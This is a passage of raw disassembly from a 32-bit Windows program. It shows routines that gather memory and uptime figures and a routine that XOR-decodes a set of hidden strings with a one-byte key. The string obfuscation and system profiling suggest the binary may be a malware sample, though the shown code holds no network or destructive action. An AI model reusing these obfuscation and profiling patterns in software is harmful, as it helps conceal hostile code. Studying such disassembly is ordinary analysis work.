  4073a1:	50                   	push   %eax
  4073a2:	ff 95 dc fa ff ff    	call   *-0x524(%ebp)
  4073a8:	8b 8d b8 fa ff ff    	mov    -0x548(%ebp),%ecx
  4073ae:	51                   	push   %ecx
  4073af:	68 7c 9b 40 00       	push   $0x409b7c
  4073b4:	8d 95 c8 fa ff ff    	lea    -0x538(%ebp),%edx
  4073ba:	52                   	push   %edx
  4073bb:	ff 15 74 90 40 00    	call   *0x409074
  4073c1:	83 c4 0c             	add    $0xc,%esp
  4073c4:	8d 85 c8 fa ff ff    	lea    -0x538(%ebp),%eax
  4073ca:	50                   	push   %eax
  4073cb:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4073ce:	83 c1 4c             	add    $0x4c,%ecx
  4073d1:	51                   	push   %ecx
  4073d2:	e8 8d 05 00 00       	call   0x407964
  4073d7:	83 c4 08             	add    $0x8,%esp
  4073da:	68 88 9b 40 00       	push   $0x409b88
  4073df:	ff 95 e0 fc ff ff    	call   *-0x320(%ebp)
  4073e5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4073e8:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  4073ec:	0f 84 ca 00 00 00    	je     0x4074bc
  4073f2:	68 98 9b 40 00       	push   $0x409b98
  4073f7:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4073fa:	52                   	push   %edx
  4073fb:	ff 95 e4 fc ff ff    	call   *-0x31c(%ebp)
  407401:	89 85 a0 fa ff ff    	mov    %eax,-0x560(%ebp)
  407407:	83 bd a0 fa ff ff 00 	cmpl   $0x0,-0x560(%ebp)
  40740e:	0f 84 a8 00 00 00    	je     0x4074bc
  407414:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40741a:	50                   	push   %eax
  40741b:	ff 95 a0 fa ff ff    	call   *-0x560(%ebp)
  407421:	8b 4d 88             	mov    -0x78(%ebp),%ecx
  407424:	89 8d 74 f9 ff ff    	mov    %ecx,-0x68c(%ebp)
  40742a:	c7 85 78 f9 ff ff 00 	movl   $0x0,-0x688(%ebp)
  407431:	00 00 00 
  407434:	df ad 74 f9 ff ff    	fildll -0x68c(%ebp)
  40743a:	8b 55 84             	mov    -0x7c(%ebp),%edx
  40743d:	89 95 6c f9 ff ff    	mov    %edx,-0x694(%ebp)
  407443:	c7 85 70 f9 ff ff 00 	movl   $0x0,-0x690(%ebp)
  40744a:	00 00 00 
  40744d:	df ad 6c f9 ff ff    	fildll -0x694(%ebp)
  407453:	de f9                	fdivrp %st,%st(1)
  407455:	dc 0d 00 9c 40 00    	fmull  0x409c00
  40745b:	83 ec 08             	sub    $0x8,%esp
  40745e:	dd 1c 24             	fstpl  (%esp)
  407461:	8b 45 88             	mov    -0x78(%ebp),%eax
  407464:	c1 e8 0a             	shr    $0xa,%eax
  407467:	c1 e8 0a             	shr    $0xa,%eax
  40746a:	50                   	push   %eax
  40746b:	68 50 d5 40 00       	push   $0x40d550
  407470:	8b 4d 84             	mov    -0x7c(%ebp),%ecx
  407473:	c1 e9 0a             	shr    $0xa,%ecx
  407476:	c1 e9 0a             	shr    $0xa,%ecx
  407479:	51                   	push   %ecx
  40747a:	68 40 d5 40 00       	push   $0x40d540
  40747f:	68 10 d5 40 00       	push   $0x40d510
  407484:	68 ac 9b 40 00       	push   $0x409bac
  407489:	8d 95 a0 f9 ff ff    	lea    -0x660(%ebp),%edx
  40748f:	52                   	push   %edx
  407490:	ff 15 74 90 40 00    	call   *0x409074
  407496:	83 c4 24             	add    $0x24,%esp
  407499:	8b 45 08             	mov    0x8(%ebp),%eax
  40749c:	c6 80 4c 01 00 00 00 	movb   $0x0,0x14c(%eax)
  4074a3:	8d 8d a0 f9 ff ff    	lea    -0x660(%ebp),%ecx
  4074a9:	51                   	push   %ecx
  4074aa:	8b 55 08             	mov    0x8(%ebp),%edx
  4074ad:	81 c2 4c 01 00 00    	add    $0x14c,%edx
  4074b3:	52                   	push   %edx
  4074b4:	e8 4f 04 00 00       	call   0x407908
  4074b9:	83 c4 08             	add    $0x8,%esp
  4074bc:	ff 95 a0 fd ff ff    	call   *-0x260(%ebp)
  4074c2:	89 85 10 fb ff ff    	mov    %eax,-0x4f0(%ebp)
  4074c8:	8b 85 10 fb ff ff    	mov    -0x4f0(%ebp),%eax
  4074ce:	33 d2                	xor    %edx,%edx
  4074d0:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  4074d5:	f7 f1                	div    %ecx
  4074d7:	33 d2                	xor    %edx,%edx
  4074d9:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  4074de:	f7 f1                	div    %ecx
  4074e0:	33 d2                	xor    %edx,%edx
  4074e2:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  4074e7:	f7 f1                	div    %ecx
  4074e9:	33 d2                	xor    %edx,%edx
  4074eb:	b9 18 00 00 00       	mov    $0x18,%ecx
  4074f0:	f7 f1                	div    %ecx
  4074f2:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4074f5:	8b 55 a0             	mov    -0x60(%ebp),%edx
  4074f8:	6b d2 18             	imul   $0x18,%edx,%edx
  4074fb:	6b d2 3c             	imul   $0x3c,%edx,%edx
  4074fe:	6b d2 3c             	imul   $0x3c,%edx,%edx
  407501:	69 d2 e8 03 00 00    	imul   $0x3e8,%edx,%edx
  407507:	8b 85 10 fb ff ff    	mov    -0x4f0(%ebp),%eax
  40750d:	2b c2                	sub    %edx,%eax
  40750f:	33 d2                	xor    %edx,%edx
  407511:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  407516:	f7 f1                	div    %ecx
  407518:	33 d2                	xor    %edx,%edx
  40751a:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  40751f:	f7 f1                	div    %ecx
  407521:	33 d2                	xor    %edx,%edx
  407523:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  407528:	f7 f1                	div    %ecx
  40752a:	89 85 24 fb ff ff    	mov    %eax,-0x4dc(%ebp)
  407530:	8b 95 24 fb ff ff    	mov    -0x4dc(%ebp),%edx
  407536:	6b d2 3c             	imul   $0x3c,%edx,%edx
  407539:	6b d2 3c             	imul   $0x3c,%edx,%edx
  40753c:	69 d2 e8 03 00 00    	imul   $0x3e8,%edx,%edx
  407542:	8b 85 10 fb ff ff    	mov    -0x4f0(%ebp),%eax
  407548:	2b c2                	sub    %edx,%eax
  40754a:	33 d2                	xor    %edx,%edx
  40754c:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  407551:	f7 f1                	div    %ecx
  407553:	33 d2                	xor    %edx,%edx
  407555:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  40755a:	f7 f1                	div    %ecx
  40755c:	89 85 14 fb ff ff    	mov    %eax,-0x4ec(%ebp)
  407562:	8b 95 24 fb ff ff    	mov    -0x4dc(%ebp),%edx
  407568:	6b d2 3c             	imul   $0x3c,%edx,%edx
  40756b:	6b d2 3c             	imul   $0x3c,%edx,%edx
  40756e:	69 d2 e8 03 00 00    	imul   $0x3e8,%edx,%edx
  407574:	8b 85 10 fb ff ff    	mov    -0x4f0(%ebp),%eax
  40757a:	2b c2                	sub    %edx,%eax
  40757c:	8b 8d 14 fb ff ff    	mov    -0x4ec(%ebp),%ecx
  407582:	6b c9 3c             	imul   $0x3c,%ecx,%ecx
  407585:	69 c9 e8 03 00 00    	imul   $0x3e8,%ecx,%ecx
  40758b:	2b c1                	sub    %ecx,%eax
  40758d:	33 d2                	xor    %edx,%edx
  40758f:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
  407594:	f7 f1                	div    %ecx
  407596:	89 45 a4             	mov    %eax,-0x5c(%ebp)
  407599:	68 34 d5 40 00       	push   $0x40d534
  40759e:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4075a1:	52                   	push   %edx
  4075a2:	68 2c d5 40 00       	push   $0x40d52c
  4075a7:	8b 85 14 fb ff ff    	mov    -0x4ec(%ebp),%eax
  4075ad:	50                   	push   %eax
  4075ae:	68 24 d5 40 00       	push   $0x40d524
  4075b3:	8b 8d 24 fb ff ff    	mov    -0x4dc(%ebp),%ecx
  4075b9:	51                   	push   %ecx
  4075ba:	68 20 d5 40 00       	push   $0x40d520
  4075bf:	8b 55 a0             	mov    -0x60(%ebp),%edx
  4075c2:	52                   	push   %edx
  4075c3:	68 18 d5 40 00       	push   $0x40d518
  4075c8:	68 cc 9b 40 00       	push   $0x409bcc
  4075cd:	8b 45 08             	mov    0x8(%ebp),%eax
  4075d0:	05 4c 02 00 00       	add    $0x24c,%eax
  4075d5:	50                   	push   %eax
  4075d6:	ff 15 74 90 40 00    	call   *0x409074
  4075dc:	83 c4 2c             	add    $0x2c,%esp
  4075df:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4075e2:	c6 81 cc 02 00 00 00 	movb   $0x0,0x2cc(%ecx)
  4075e9:	68 f4 9b 40 00       	push   $0x409bf4
  4075ee:	8b 55 08             	mov    0x8(%ebp),%edx
  4075f1:	81 c2 cc 02 00 00    	add    $0x2cc,%edx
  4075f7:	52                   	push   %edx
  4075f8:	e8 0b 03 00 00       	call   0x407908
  4075fd:	83 c4 08             	add    $0x8,%esp
  407600:	b0 01                	mov    $0x1,%al
  407602:	8b e5                	mov    %ebp,%esp
  407604:	5d                   	pop    %ebp
  407605:	c3                   	ret
  407606:	cc                   	int3
  407607:	cc                   	int3
  407608:	cc                   	int3
  407609:	cc                   	int3
  40760a:	cc                   	int3
  40760b:	cc                   	int3
  40760c:	cc                   	int3
  40760d:	cc                   	int3
  40760e:	cc                   	int3
  40760f:	cc                   	int3
  407610:	55                   	push   %ebp
  407611:	8b ec                	mov    %esp,%ebp
  407613:	83 ec 3c             	sub    $0x3c,%esp
  407616:	83 3d bc de 40 00 00 	cmpl   $0x0,0x40debc
  40761d:	74 05                	je     0x407624
  40761f:	e9 da 02 00 00       	jmp    0x4078fe
  407624:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40762b:	eb 09                	jmp    0x407636
  40762d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407630:	83 c0 01             	add    $0x1,%eax
  407633:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407636:	83 7d fc 0b          	cmpl   $0xb,-0x4(%ebp)
  40763a:	7d 18                	jge    0x407654
  40763c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40763f:	0f b6 91 fc d4 40 00 	movzbl 0x40d4fc(%ecx),%edx
  407646:	83 f2 5a             	xor    $0x5a,%edx
  407649:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40764c:	88 90 fc d4 40 00    	mov    %dl,0x40d4fc(%eax)
  407652:	eb d9                	jmp    0x40762d
  407654:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  40765b:	eb 09                	jmp    0x407666
  40765d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  407660:	83 c1 01             	add    $0x1,%ecx
  407663:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  407666:	83 7d f8 04          	cmpl   $0x4,-0x8(%ebp)
  40766a:	7d 18                	jge    0x407684
  40766c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40766f:	0f b6 82 08 d5 40 00 	movzbl 0x40d508(%edx),%eax
  407676:	83 f0 5a             	xor    $0x5a,%eax
  407679:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40767c:	88 81 08 d5 40 00    	mov    %al,0x40d508(%ecx)
  407682:	eb d9                	jmp    0x40765d
  407684:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40768b:	eb 09                	jmp    0x407696
  40768d:	8b 55 f4             	mov    -0xc(%ebp),%edx
  407690:	83 c2 01             	add    $0x1,%edx
  407693:	89 55 f4             	mov    %edx,-0xc(%ebp)
  407696:	83 7d f4 07          	cmpl   $0x7,-0xc(%ebp)
  40769a:	7d 18                	jge    0x4076b4
  40769c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40769f:	0f b6 88 10 d5 40 00 	movzbl 0x40d510(%eax),%ecx
  4076a6:	83 f1 5a             	xor    $0x5a,%ecx
  4076a9:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4076ac:	88 8a 10 d5 40 00    	mov    %cl,0x40d510(%edx)
  4076b2:	eb d9                	jmp    0x40768d
  4076b4:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  4076bb:	eb 09                	jmp    0x4076c6
  4076bd:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4076c0:	83 c0 01             	add    $0x1,%eax
  4076c3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4076c6:	83 7d f0 07          	cmpl   $0x7,-0x10(%ebp)
  4076ca:	7d 18                	jge    0x4076e4
  4076cc:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4076cf:	0f b6 91 18 d5 40 00 	movzbl 0x40d518(%ecx),%edx
  4076d6:	83 f2 5a             	xor    $0x5a,%edx
  4076d9:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4076dc:	88 90 18 d5 40 00    	mov    %dl,0x40d518(%eax)
  4076e2:	eb d9                	jmp    0x4076bd
  4076e4:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  4076eb:	eb 09                	jmp    0x4076f6
  4076ed:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4076f0:	83 c1 01             	add    $0x1,%ecx
  4076f3:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4076f6:	83 7d ec 03          	cmpl   $0x3,-0x14(%ebp)
  4076fa:	7d 18                	jge    0x407714
  4076fc:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4076ff:	0f b6 82 20 d5 40 00 	movzbl 0x40d520(%edx),%eax
  407706:	83 f0 5a             	xor    $0x5a,%eax
  407709:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40770c:	88 81 20 d5 40 00    	mov    %al,0x40d520(%ecx)
  407712:	eb d9                	jmp    0x4076ed
  407714:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40771b:	eb 09                	jmp    0x407726
  40771d:	8b 55 e8             	mov    -0x18(%ebp),%edx
  407720:	83 c2 01             	add    $0x1,%edx
  407723:	89 55 e8             	mov    %edx,-0x18(%ebp)
  407726:	83 7d e8 04          	cmpl   $0x4,-0x18(%ebp)
  40772a:	7d 18                	jge    0x407744
  40772c:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40772f:	0f b6 88 24 d5 40 00 	movzbl 0x40d524(%eax),%ecx
  407736:	83 f1 5a             	xor    $0x5a,%ecx
  407739:	8b 55 e8             	mov    -0x18(%ebp),%edx
  40773c:	88 8a 24 d5 40 00    	mov    %cl,0x40d524(%edx)
  407742:	eb d9                	jmp    0x40771d
  407744:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%ebp)
  40774b:	eb 09                	jmp    0x407756
  40774d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407750:	83 c0 01             	add    $0x1,%eax
  407753:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  407756:	83 7d e4 06          	cmpl   $0x6,-0x1c(%ebp)
  40775a:	7d 18                	jge    0x407774
  40775c:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  40775f:	0f b6 91 2c d5 40 00 	movzbl 0x40d52c(%ecx),%edx
  407766:	83 f2 5a             	xor    $0x5a,%edx
  407769:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40776c:	88 90 2c d5 40 00    	mov    %dl,0x40d52c(%eax)
  407772:	eb d9                	jmp    0x40774d
  407774:	c7 45 e0 00 00 00 00 	movl   $0x0,-0x20(%ebp)
  40777b:	eb 09                	jmp    0x407786
  40777d:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  407780:	83 c1 01             	add    $0x1,%ecx
  407783:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407786:	83 7d e0 06          	cmpl   $0x6,-0x20(%ebp)
  40778a:	7d 18                	jge    0x4077a4
  40778c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40778f:	0f b6 82 34 d5 40 00 	movzbl 0x40d534(%edx),%eax
  407796:	83 f0 5a             	xor    $0x5a,%eax
  407799:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40779c:	88 81 34 d5 40 00    	mov    %al,0x40d534(%ecx)
  4077a2:	eb d9                	jmp    0x40777d
  4077a4:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4077ab:	eb 09                	jmp    0x4077b6
  4077ad:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4077b0:	83 c2 01             	add    $0x1,%edx
  4077b3:	89 55 dc             	mov    %edx,-0x24(%ebp)
  4077b6:	83 7d dc 03          	cmpl   $0x3,-0x24(%ebp)
  4077ba:	7d 18                	jge    0x4077d4
  4077bc:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4077bf:	0f b6 88 3c d5 40 00 	movzbl 0x40d53c(%eax),%ecx
  4077c6:	83 f1 5a             	xor    $0x5a,%ecx
  4077c9:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4077cc:	88 8a 3c d5 40 00    	mov    %cl,0x40d53c(%edx)
  4077d2:	eb d9                	jmp    0x4077ad
  4077d4:	c7 45 d8 00 00 00 00 	movl   $0x0,-0x28(%ebp)
  4077db:	eb 09                	jmp    0x4077e6
  4077dd:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4077e0:	83 c0 01             	add    $0x1,%eax
  4077e3:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4077e6:	83 7d d8 05          	cmpl   $0x5,-0x28(%ebp)
  4077ea:	7d 18                	jge    0x407804
  4077ec:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4077ef:	0f b6 91 40 d5 40 00 	movzbl 0x40d540(%ecx),%edx
  4077f6:	83 f2 5a             	xor    $0x5a,%edx
  4077f9:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4077fc:	88 90 40 d5 40 00    	mov    %dl,0x40d540(%eax)
  407802:	eb d9                	jmp    0x4077dd
  407804:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  40780b:	eb 09                	jmp    0x407816
  40780d:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  407810:	83 c1 01             	add    $0x1,%ecx
  407813:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  407816:	83 7d d4 04          	cmpl   $0x4,-0x2c(%ebp)
  40781a:	7d 18                	jge    0x407834
  40781c:	8b 55 d4             	mov    -0x2c(%ebp),%edx
  40781f:	0f b6 82 48 d5 40 00 	movzbl 0x40d548(%edx),%eax
  407826:	83 f0 5a             	xor    $0x5a,%eax
  407829:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40782c:	88 81 48 d5 40 00    	mov    %al,0x40d548(%ecx)
  407832:	eb d9                	jmp    0x40780d
  407834:	c7 45 d0 00 00 00 00 	movl   $0x0,-0x30(%ebp)
  40783b:	eb 09                	jmp    0x407846
  40783d:	8b 55 d0             	mov    -0x30(%ebp),%edx
  407840:	83 c2 01             	add    $0x1,%edx
  407843:	89 55 d0             	mov    %edx,-0x30(%ebp)
  407846:	83 7d d0 04          	cmpl   $0x4,-0x30(%ebp)
  40784a:	7d 18                	jge    0x407864
  40784c:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40784f:	0f b6 88 50 d5 40 00 	movzbl 0x40d550(%eax),%ecx
  407856:	83 f1 5a             	xor    $0x5a,%ecx
  407859:	8b 55 d0             	mov    -0x30(%ebp),%edx
  40785c:	88 8a 50 d5 40 00    	mov    %cl,0x40d550(%edx)
  407862:	eb d9                	jmp    0x40783d
  407864:	c7 45 cc 00 00 00 00 	movl   $0x0,-0x34(%ebp)
  40786b:	eb 09                	jmp    0x407876
  40786d:	8b 45 cc             	mov    -0x34(%ebp),%eax
  407870:	83 c0 01             	add    $0x1,%eax
  407873:	89 45 cc             	mov    %eax,-0x34(%ebp)
  407876:	83 7d cc 01          	cmpl   $0x1,-0x34(%ebp)
  40787a:	7d 18                	jge    0x407894
  40787c:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  40787f:	0f b6 91 58 d5 40 00 	movzbl 0x40d558(%ecx),%edx
  407886:	83 f2 5a             	xor    $0x5a,%edx
  407889:	8b 45 cc             	mov    -0x34(%ebp),%eax
  40788c:	88 90 58 d5 40 00    	mov    %dl,0x40d558(%eax)
  407892:	eb d9                	jmp    0x40786d
  407894:	c7 45 c8 00 00 00 00 	movl   $0x0,-0x38(%ebp)
  40789b:	eb 09                	jmp    0x4078a6
  40789d:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4078a0:	83 c1 01             	add    $0x1,%ecx
  4078a3:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4078a6:	83 7d c8 2f          	cmpl   $0x2f,-0x38(%ebp)
  4078aa:	7d 18                	jge    0x4078c4
  4078ac:	8b 55 c8             	mov    -0x38(%ebp),%edx
  4078af:	0f b6 82 5c d5 40 00 	movzbl 0x40d55c(%edx),%eax
  4078b6:	83 f0 5a             	xor    $0x5a,%eax
  4078b9:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  4078bc:	88 81 5c d5 40 00    	mov    %al,0x40d55c(%ecx)
  4078c2:	eb d9                	jmp    0x40789d
  4078c4:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  4078cb:	eb 09                	jmp    0x4078d6
  4078cd:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4078d0:	83 c2 01             	add    $0x1,%edx
  4078d3:	89 55 c4             	mov    %edx,-0x3c(%ebp)
  4078d6:	83 7d c4 2e          	cmpl   $0x2e,-0x3c(%ebp)
  4078da:	7d 18                	jge    0x4078f4
  4078dc:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  4078df:	0f b6 88 8c d5 40 00 	movzbl 0x40d58c(%eax),%ecx
  4078e6:	83 f1 5a             	xor    $0x5a,%ecx
  4078e9:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  4078ec:	88 8a 8c d5 40 00    	mov    %cl,0x40d58c(%edx)
  4078f2:	eb d9                	jmp    0x4078cd
  4078f4:	c7 05 bc de 40 00 01 	movl   $0x1,0x40debc
  4078fb:	00 00 00 
  4078fe:	8b e5                	mov    %ebp,%esp
  407900:	5d                   	pop    %ebp
  407901:	c3                   	ret
  407902:	ff 25 34 91 40 00    	jmp    *0x409134
  407908:	ff 25 70 90 40 00    	jmp    *0x409070
  40790e:	ff 25 78 90 40 00    	jmp    *0x409078
  407914:	ff 25 7c 90 40 00    	jmp    *0x40907c
  40791a:	cc                   	int3
  40791b:	cc                   	int3
  40791c:	cc                   	int3
  40791d:	cc                   	int3
  40791e:	cc                   	int3
  40791f:	cc                   	int3
  407920:	51                   	push   %ecx
  407921:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  407925:	2b c8                	sub    %eax,%ecx
  407927:	1b c0                	sbb    %eax,%eax
  407929:	f7 d0                	not    %eax
  40792b:	23 c8                	and    %eax,%ecx
  40792d:	8b c4                	mov    %esp,%eax
  40792f:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  407934:	3b c8                	cmp    %eax,%ecx
  407936:	72 0a                	jb     0x407942
  407938:	8b c1                	mov    %ecx,%eax
  40793a:	59                   	pop    %ecx
  40793b:	94                   	xchg   %eax,%esp
  40793c:	8b 00                	mov    (%eax),%eax
  40793e:	89 04 24             	mov    %eax,(%esp)
  407941:	c3                   	ret
  407942:	2d 00 10 00 00       	sub    $0x1000,%eax
  407947:	85 00                	test   %eax,(%eax)
  407949:	eb e9                	jmp    0x407934
  40794b:	cc                   	int3
  40794c:	ff 25 9c 90 40 00    	jmp    *0x40909c
  407952:	ff 25 a0 90 40 00    	jmp    *0x4090a0
  407958:	ff 25 a4 90 40 00    	jmp    *0x4090a4
  40795e:	ff 25 a8 90 40 00    	jmp    *0x4090a8
  407964:	ff 25 b4 90 40 00    	jmp    *0x4090b4
  40796a:	cc                   	int3
  40796b:	cc                   	int3
  40796c:	cc                   	int3
  40796d:	cc                   	int3
  40796e:	cc                   	int3
  40796f:	cc                   	int3
  407970:	53                   	push   %ebx
  407971:	56                   	push   %esi
  407972:	8b 44 24 18          	mov    0x18(%esp),%eax
  407976:	0b c0                	or     %eax,%eax
  407978:	75 18                	jne    0x407992
  40797a:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  40797e:	8b 44 24 10          	mov    0x10(%esp),%eax
  407982:	33 d2                	xor    %edx,%edx
  407984:	f7 f1                	div    %ecx
  407986:	8b d8                	mov    %eax,%ebx
  407988:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40798c:	f7 f1                	div    %ecx
  40798e:	8b d3                	mov    %ebx,%edx
  407990:	eb 41                	jmp    0x4079d3
  407992:	8b c8                	mov    %eax,%ecx
  407994:	8b 5c 24 14          	mov    0x14(%esp),%ebx
  407998:	8b 54 24 10          	mov    0x10(%esp),%edx
  40799c:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4079a0:	d1 e9                	shr    $1,%ecx
  4079a2:	d1 db                	rcr    $1,%ebx
  4079a4:	d1 ea                	shr    $1,%edx
  4079a6:	d1 d8                	rcr    $1,%eax
  4079a8:	0b c9                	or     %ecx,%ecx
  4079aa:	75 f4                	jne    0x4079a0
  4079ac:	f7 f3                	div    %ebx
  4079ae:	8b f0                	mov    %eax,%esi
  4079b0:	f7 64 24 18          	mull   0x18(%esp)
  4079b4:	8b c8                	mov    %eax,%ecx
  4079b6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4079ba:	f7 e6                	mul    %esi
  4079bc:	03 d1                	add    %ecx,%edx
  4079be:	72 0e                	jb     0x4079ce
  4079c0:	3b 54 24 10          	cmp    0x10(%esp),%edx
  4079c4:	77 08                	ja     0x4079ce
  4079c6:	72 07                	jb     0x4079cf
  4079c8:	3b 44 24 0c          	cmp    0xc(%esp),%eax
  4079cc:	76 01                	jbe    0x4079cf
  4079ce:	4e                   	dec    %esi
  4079cf:	33 d2                	xor    %edx,%edx
  4079d1:	8b c6                	mov    %esi,%eax
  4079d3:	5e                   	pop    %esi
  4079d4:	5b                   	pop    %ebx
  4079d5:	c2 10 00             	ret    $0x10
  4079d8:	68 f4 7d 40 00       	push   $0x407df4
  4079dd:	e8 d5 03 00 00       	call   0x407db7
  4079e2:	a1 e4 de 40 00       	mov    0x40dee4,%eax
  4079e7:	c7 04 24 d4 de 40 00 	movl   $0x40ded4,(%esp)
  4079ee:	ff 35 e0 de 40 00    	push   0x40dee0
  4079f4:	a3 d4 de 40 00       	mov    %eax,0x40ded4
  4079f9:	68 c4 de 40 00       	push   $0x40dec4
  4079fe:	68 c8 de 40 00       	push   $0x40dec8
  407a03:	68 c0 de 40 00       	push   $0x40dec0
  407a08:	ff 15 d0 90 40 00    	call   *0x4090d0
  407a0e:	83 c4 14             	add    $0x14,%esp
  407a11:	a3 d0 de 40 00       	mov    %eax,0x40ded0
  407a16:	85 c0                	test   %eax,%eax
  407a18:	79 08                	jns    0x407a22
  407a1a:	6a 08                	push   $0x8
  407a1c:	e8 ef 02 00 00       	call   0x407d10
  407a21:	59                   	pop    %ecx
  407a22:	c3                   	ret
  407a23:	6a 5c                	push   $0x5c
  407a25:	68 78 9c 40 00       	push   $0x409c78
  407a2a:	e8 51 05 00 00       	call   0x407f80
  407a2f:	33 db                	xor    %ebx,%ebx
  407a31:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  407a34:	8d 45 94             	lea    -0x6c(%ebp),%eax
  407a37:	50                   	push   %eax
  407a38:	ff 15 54 90 40 00    	call   *0x409054
  407a3e:	39 1d 24 e2 40 00    	cmp    %ebx,0x40e224
  407a44:	75 0b                	jne    0x407a51
  407a46:	53                   	push   %ebx
  407a47:	53                   	push   %ebx
  407a48:	6a 01                	push   $0x1
  407a4a:	53                   	push   %ebx
  407a4b:	ff 15 58 90 40 00    	call   *0x409058
  407a51:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  407a54:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  407a5a:	8b 70 04             	mov    0x4(%eax),%esi
  407a5d:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  407a60:	bf 18 e2 40 00       	mov    $0x40e218,%edi
  407a65:	53                   	push   %ebx
  407a66:	56                   	push   %esi
  407a67:	57                   	push   %edi
  407a68:	ff 15 5c 90 40 00    	call   *0x40905c
  407a6e:	3b c3                	cmp    %ebx,%eax
  407a70:	74 19                	je     0x407a8b
  407a72:	3b c6                	cmp    %esi,%eax
  407a74:	75 08                	jne    0x407a7e
  407a76:	33 f6                	xor    %esi,%esi
  407a78:	46                   	inc    %esi
  407a79:	89 75 dc             	mov    %esi,-0x24(%ebp)
  407a7c:	eb 10                	jmp    0x407a8e
  407a7e:	68 e8 03 00 00       	push   $0x3e8
  407a83:	ff 15 60 90 40 00    	call   *0x409060
  407a89:	eb da                	jmp    0x407a65
  407a8b:	33 f6                	xor    %esi,%esi
  407a8d:	46                   	inc    %esi
  407a8e:	a1 14 e2 40 00       	mov    0x40e214,%eax
  407a93:	3b c6                	cmp    %esi,%eax
  407a95:	75 0a                	jne    0x407aa1
  407a97:	6a 1f                	push   $0x1f
  407a99:	e8 72 02 00 00       	call   0x407d10
  407a9e:	59                   	pop    %ecx
  407a9f:	eb 3b                	jmp    0x407adc
  407aa1:	a1 14 e2 40 00       	mov    0x40e214,%eax
  407aa6:	85 c0                	test   %eax,%eax
  407aa8:	75 2c                	jne    0x407ad6
  407aaa:	89 35 14 e2 40 00    	mov    %esi,0x40e214
  407ab0:	68 8c 91 40 00       	push   $0x40918c
  407ab5:	68 80 91 40 00       	push   $0x409180
  407aba:	e8 b3 04 00 00       	call   0x407f72
  407abf:	59                   	pop    %ecx
  407ac0:	59                   	pop    %ecx
